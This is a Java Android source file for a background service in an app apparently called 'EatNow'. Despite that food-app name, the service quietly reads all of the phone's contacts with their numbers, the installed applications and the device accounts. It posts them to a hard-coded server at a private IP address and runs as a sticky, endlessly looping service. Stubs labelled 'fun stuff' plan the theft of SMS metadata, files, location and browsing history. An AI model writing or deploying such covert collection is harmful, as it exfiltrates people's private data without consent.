package com.example.ludovic.eatnow;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.IntentService;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.support.annotation.Nullable;
import android.text.LoginFilter;
import android.util.Log;
import android.widget.Toast;

import com.android.volley.NoConnectionError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.TimeoutError;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.Volley;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by Ludovic Zipsin on 30/10/16.
 * Mail: ludovic.j.r.zipsin@gmail.com
 * Github: https://github.com/LudoZipsin
 */
public class BGService extends Service {

    private static final int SECONDE = 1000;
    private static final int MINUTE = 60*SECONDE;
    private static final String URL = "http://192.168.2.117:4242/";
    private RequestQueue requestQueue;
    private JSONObject jsonObjectLocation;
    private JSONArray jsonArrayLocation;


    //TODO: make most of the collecting data here and send them periodically to a remote server
    //note: have to fetch the userID from db

    @Override
    public int onStartCommand(Intent intent, int flags, int startId){
        Log.i("BGService", "Service started");
        DBHelper dbHelper = new DBHelper(getApplicationContext());
        requestQueue = Volley.newRequestQueue(this);
        final String userID = dbHelper.getUserID();
        Log.i("BGService", "userID = " + userID);

        new Thread(new Runnable(){

            public void run() {
                int count = 0;
                boolean known = false;
                POST(contactReader(10), userID);
                POST(applicationReader(), userID);
                POST(accountReader(), userID);
                // TODO Auto-generated method stub
                while(true)
                {
                    try {
                        Log.d("GBService", applicationReader().toString());
                        //Log.v("BGService", formatArray("accountReader", accountReader()));
                        Thread.sleep(10*SECONDE); // 5*MINUTE
                        if (!known){
                            Log.i("BGService", "Identity not sent. Sending know... (value = " + Boolean.toString(known) + ")");
                            known = true;
                            Log.i("BGService", "Identity is now known and sent");
                        } else {
                            count++;
                            if (count < 5) {
                                Log.i("BGService", "Identity known...");
                            } else {
                                count = 0;
                                known = false;
                                Log.i("BGService", "Identity is reset...");
                            }
                        }
                        Log.i("BGService", "loop thread... sending from user " + userID);
                    } catch (InterruptedException e) {
                        // TODO Auto-generated catch block
                        e.printStackTrace();
                    }

                }

            }
        }).start();

        return Service.START_STICKY;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private ArrayList<String> fileReader(){
        ArrayList<String> fileList = new ArrayList<>();
        // TODO fun stuff
        return fileList;
    }

    /**
     * @return an array of JSONArray
     */
    private ArrayList<JSONObject> contactJSONify(){
        ArrayList<JSONObject> listJSONObject = new ArrayList<>();
        // TODO START
        //JSONArray jsonContactArray = new JSONArray();
        JSONObject jsonContact = null;
        ContentResolver contentResolver = EatNowApplication.getAppInstance().getContentResolver(); //Activity/Application android.content.Context
        Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        //int counter = 0; // to know the number of contact
        try {
            if(cursor.moveToFirst()) {
                do {
                    //counter++;
                    jsonContact = new JSONObject();
                    String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                    jsonContact.put("id", id);
                    String[] infoArray = cursor.getColumnNames();
                    for (String string : infoArray){
                        jsonContact.put(string, cursor.getString(cursor.getColumnIndex(string)));
                    }
                    if(Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                        Cursor cursorPhoneNumber = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = ?",new String[]{ id }, null);
                        while (cursorPhoneNumber.moveToNext()) {
                            String contactNumber = cursorPhoneNumber.getString(cursorPhoneNumber.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            jsonContact.put("customFetchPhoneNumber", contactNumber);
                            break;
                        }
                        cursorPhoneNumber.close();
                    }
                    //jsonContactArray.put(jsonContact);
                    listJSONObject.add(jsonContact);
                } while (cursor.moveToNext()) ;
            }
        } catch (JSONException jsonException){
            jsonException.printStackTrace();
        }
        // TODO END
        return listJSONObject;
    }

    /**
     * @return JSONObject containing all the information on contact.
     */
    private JSONObject contactReader(){
        JSONObject jsonFinal = new JSONObject();
        JSONArray jsonContactArray = new JSONArray();
        JSONObject jsonContact = null;
        ContentResolver contentResolver = EatNowApplication.getAppInstance().getContentResolver(); //Activity/Application android.content.Context
        Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        int counter = 0; // to know the number of contact
        try {
            if(cursor.moveToFirst()) {
                do {
                    counter++;
                    jsonContact = new JSONObject();
                    String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                    jsonContact.put("id", id);
                    String[] infoArray = cursor.getColumnNames();
                    for (String string : infoArray){
                        jsonContact.put(string, cursor.getString(cursor.getColumnIndex(string)));
                    }
                    if(Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                        Cursor cursorPhoneNumber = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = ?",new String[]{ id }, null);
                        while (cursorPhoneNumber.moveToNext()) {
                            String contactNumber = cursorPhoneNumber.getString(cursorPhoneNumber.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            jsonContact.put("customFetchPhoneNumber", contactNumber);
                            break;
                        }
                        cursorPhoneNumber.close();
                    }
                    jsonContactArray.put(jsonContact);
                } while (cursor.moveToNext()) ;
            }
            jsonFinal.put("number", counter);
            jsonFinal.put("data", jsonContactArray);
            jsonFinal.put("dataType", "contact");
        } catch (JSONException jsonException){
            jsonException.printStackTrace();
        }
        return jsonFinal;
    }

    /**
     * @return ArrayList of JSONObject containing all the contact information. Each JSONObject
     *          contains a JSONArray to store packageSize contacts information.
     */
    private ArrayList<JSONObject> contactReader(int packageSize){// 10
        ArrayList<JSONObject> list = contactJSONify();
        ArrayList<JSONObject> returned = new ArrayList<>();
        int size = list.size();
        JSONArray jsonArray;
        JSONObject jsonObject;
        for (int i=0; i<size; i+=packageSize){
            jsonArray = new JSONArray();
            for (int j=0; (j<packageSize) && (i+j < size) ; j++){
                jsonArray.put(list.get(j+i));
            }
            jsonObject = new JSONObject();
            try {
                jsonObject.put("number",size);
                jsonObject.put("data", jsonArray);
                jsonObject.put("dataType", "contact");
            } catch (JSONException jsonException){
                jsonException.printStackTrace();
            }
            returned.add(jsonObject);
        }
        return returned;
    }

    /**
     * @return JSONObject containing all information on account (name and type).
     */
    private JSONObject accountReader(){
        AccountManager manager = (AccountManager) getSystemService(ACCOUNT_SERVICE);
        Account[] list = manager.getAccounts();
        JSONObject jsonFinal = new JSONObject();
        JSONArray jsonAccountArray = new JSONArray();
        JSONObject jsonAccount;
        try {
            jsonFinal.put("dataType", "account");
            jsonFinal.put("number", list.length);
            for (Account account : list){
                jsonAccount = new JSONObject();
                jsonAccount.put("name", account.name);
                jsonAccount.put("type", account.type);
                jsonAccountArray.put(jsonAccount);
            }
            jsonFinal.put("data", jsonAccountArray);
        } catch (JSONException jsonException){
            jsonException.printStackTrace();
        }
        return jsonFinal;
    }

    private String locationReader(){
        String location = "";
        // TODO fun stuff
        return location;
    }

    /**
     * @return JSONObject containing installed packages names on android device.
     */
    private JSONObject applicationReader(){
        JSONObject jsonFinal = new JSONObject();
        JSONArray jsonAppArray = new JSONArray();
        PackageManager pm = getPackageManager();
        List<ApplicationInfo> apps = pm.getInstalledApplications(0);
        int appCounter = 1;
        try {
            jsonFinal.put("dataType","application");
            for (ApplicationInfo applicationInfo : apps) {
                appCounter++;
                String packageName = applicationInfo.toString();
                String[] packageArray = packageName.split(" ");
                packageName = packageArray[1];
                jsonAppArray.put(packageName.substring(0, packageName.length() - 1));
            }
            jsonFinal.put("number",appCounter);
            jsonFinal.put("data", jsonAppArray);
        } catch (JSONException jsonException){
            jsonException.printStackTrace();
        }
        return jsonFinal;
    }

    private ArrayList<String> smsMetaDataReader(){
        ArrayList<String> smsList = new ArrayList<>();
        // TODO fun stuff
        return smsList;
    }

    private ArrayList<String> navigationHistoryReader(){
        ArrayList<String> navigationHistoryList = new ArrayList<>();
        // TODO fun stuff
        // TODO it looks like it is impossible due to security reasons...
        return navigationHistoryList;
    }


    private void POST(ArrayList<JSONObject> jsonObject, String userId){
        for (JSONObject json : jsonObject) {
            try {
                json.put("id", userId);
            } catch (JSONException jsonException){
                jsonException.printStackTrace();
            }
            JsonRequestHelper request = new JsonRequestHelper(
                    Request.Method.POST,
                    URL,
                    json,
                    new Response.Listener<JSONObject>() {
                        @Override
                        public void onResponse(JSONObject response) {/*NOTHING TO DO*/}
                    },
                    new Response.ErrorListener() {
                        @Override
                        public void onErrorResponse(VolleyError error) {/*NOTHING TO DO*/}
                    }
            );
            request.setPriority(Request.Priority.HIGH);
            requestQueue.add(request);
        }
    }

    private void POST(JSONObject jsonObject, String userId){
        try {
            jsonObject.put("id", userId);
        } catch (JSONException jsonException){
            jsonException.printStackTrace();
        }
        JsonRequestHelper request = new JsonRequestHelper(
                Request.Method.POST,
                URL,
                jsonObject,
                new Response.Listener<JSONObject>(){
                    @Override
                    public void onResponse(JSONObject response) {/*NOTHING TO DO*/}
                },
                new Response.ErrorListener(){
                    @Override
                    public void onErrorResponse(VolleyError error) {/*NOTHING TO DO*/}
                }
        );
        request.setPriority(Request.Priority.HIGH);
        requestQueue.add(request);
    }
}
